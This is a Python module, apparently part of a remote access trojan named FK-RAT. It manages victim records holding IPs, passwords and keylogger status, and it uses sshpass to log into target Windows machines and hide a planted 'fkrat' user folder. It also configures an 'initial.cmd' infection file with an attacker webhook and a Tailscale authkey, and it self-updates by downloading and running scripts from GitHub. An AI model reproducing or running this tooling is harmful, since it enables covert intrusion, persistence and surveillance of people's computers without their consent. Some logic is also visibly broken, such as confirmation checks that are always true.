import getpass
import os
import readline
import filecmp
import json
import requests
import urllib.request

from modules import payloads as pay

username = getpass.getuser()
header = f"{username}@FK-RAT"
github_path = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/"
local_path = f"/home/{username}/.FK-RAT" if username != "root" else "/root/.FK-RAT"


## Function for everything
def rlinput(prompt, prefill=''):
    readline.set_startup_hook(lambda: readline.insert_text(prefill))
    try:
        return input(prompt)  # or raw_input in Python 2
    finally:
        readline.set_startup_hook()

def rmWhiteSpace(var):
    output = ""
    for char in var:
        if char != " ":
            output += char
    return output


## Options
def edit_file(file):
    config = pay.read_config(file)
    username = rlinput("       Username   : ", config.get("USERNAME")).replace(" ", "")
    ip = rlinput("       Ip         : ", config.get("IPADDRESS")).replace(" ", "")
    password = rlinput("       Password   : ", config.get("PASSWORD")).replace(" ", "")
    tempDir = rlinput("       TempDir    : ", config.get("TEMPDIR")).replace(" ", "")
    try:
        keylogger = config.get("KEYLOGGER")
    except IndexError:
        keylogger = "Not set"

    target_file = open(f"{local_path}/targets/{file}", "w")
    target_file.write(f"{ip} \n{password} \n{username}\n{keylogger}\n{tempDir}")

def new_file():
    file_name = rmWhiteSpace(input(f"Filename   : "))
    username = rmWhiteSpace(input(f"Username   : "))
    ip = rmWhiteSpace(input(f"Ip         : "))
    password = rmWhiteSpace(input(f"Password   : "))
    tempDir = rmWhiteSpace(input(f"TempDir   : "))

    if not os.path.exists(f"{local_path}/targets"):
        os.mkdir(f"{local_path}/targets")
    target_file = open(f"{local_path}/targets/{file_name}.fk", "w")
    target_file.write(f"{ip} \n{password} \n{username}\nNot set\n{tempDir}")
    print("[..] Please wait while we configure everything (Shouldn't take longer that 10 seconds)")
    os.system(
        f"sshpass -p \"{password}\" ssh fkrat@{ip} -o StrictHostKeyChecking=accept-new " +
        " 'powershell attrib.exe +h C:/Users/fkrat'")

def delete_file(file):
    os.remove(f"{local_path}/targets/" + file)

def getTargets(help_menu):
    targets = []
    i = 0
    for file in os.listdir(f"{local_path}/targets"):
        if file.split('.')[1] == "fk":
            print(f"            [{i}]     {file.split('.')[0]}")
            targets += [file]
            i += 1
    if len(os.listdir(f"{local_path}/targets")) == 0:
        print(f"            [-]     No targets found")
        print(help_menu)
        exit(0)
    return(targets)

def prepairInfectionFile():
    with open("fkrat.conf", "x+") as config_file:
        webhook = input("Which webhook should the RAT use : ").replace(" ", "")
        authkey = input("Which Tailscale Network should the RAT be added to (authkey) : ")
        x = {
            "webhook": f"{webhook}",
            "authkey": f"{authkey}"
        }
        config_file = json.dump(x)
        
        pay.editFile(f"{local_path}/initial.cmd", 9, f"set 'WEBHOOK={webhook}'\n")   
        pay.editFile(f"{local_path}/initial.cmd", 10, f"set 'AUTHKEY={authkey}'\n")
    data = {"content": "This Webhook as been added to FK-RAT", "username": "FK-RAT Configuration"}
    requests.post(webhook, json=data)
    print("[!!] To infect a computer just execute the file 'initial.cmd' on the Targets Computer")   
    
def update():
    print("[..] Checking for Updates...")
    update_needed = False
    local_options = f"{local_path}/modules/options.py"
    local_payloads = f"{local_path}/modules/payloads.py"
    local_main = f"{local_path}/main.py"
    
    if not os.path.exists(f"{local_path}/Downloads"):
        os.mkdir(f"{local_path}/Downloads")

    opt = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/options.py"
    pay = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/modules/payloads.py"
    main = "https://raw.githubusercontent.com/Sunnickel/FK-RAT/main/main.py"
    
    try: 
        urllib.request.urlretrieve(opt, f"{local_path}/Downloads/options.py")
        urllib.request.urlretrieve(pay, f"{local_path}/Downloads/payloads.py")
        urllib.request.urlretrieve(main, f"{local_path}/Downloads/main.py")
    except urllib.error.URLError:
        print("[!!] Please check your internet connection")

    github_options = f"{local_path}/Downloads/options.py"
    github_payload = f"{local_path}/Downloads/payloads.py"
    github_main = f"{local_path}/Downloads/main.py"
    
    update_needed = filecmp.cmp(local_options, github_options, shallow=True)
    update_needed = filecmp.cmp(local_payloads, github_payload, shallow=True)
    update_needed = filecmp.cmp(local_main, github_main, shallow=True)
    
    print(update_needed)
    os.system(f"rm -rf {local_path}/Downloads/*")
    if update_needed:
        choice = input("[??] There is a newer version of this tool avaible, do you want to update it? \n(y or n [n = default])")
        if choice == "y" or "Y":
            os.system(f"chmod +x {local_path}/modules/update.sh && {local_path}/modules/update.sh")
        else:
            return

def remove():
    choice = input("[??] Are you sure you want to remove FKRAT from your computer? \n(y or n [n = default])")
    if choice == "y" or "Y":
        if choice == "y" or "Y":
            os.system(f"chmod +x {local_path}/modules/remove.sh && {local_path}/modules/remove.sh")
        else:
            return
